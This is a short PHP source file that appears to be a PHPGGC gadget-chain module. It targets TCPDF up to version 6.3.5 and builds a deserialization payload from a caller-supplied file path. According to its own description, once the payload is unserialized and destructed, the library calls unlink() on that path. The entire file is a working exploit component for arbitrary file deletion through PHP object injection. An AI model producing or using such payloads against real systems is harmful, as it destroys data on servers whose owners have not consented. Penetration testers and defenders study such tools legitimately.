<?php

namespace GadgetChain\TCPDF;

class FD1 extends \PHPGGC\GadgetChain\FileDelete
{
    public static $version = '<= 6.3.5';
    public static $vector = '__destruct';
    public static $author = 'timoles';
    public static $informations = '
        TCPDF contains the varialbe "imagekeys" which excepts an array of strings. Upon __destruct an "unlink()" is called on all filepaths within the imagekeys array.';
    public static $parameters = [
        'remote_file'
    ];

    public function generate(array $parameters)
    {
        $file = $parameters['remote_file'];

        return new \TCPDF(
            $file
        );
    }
}
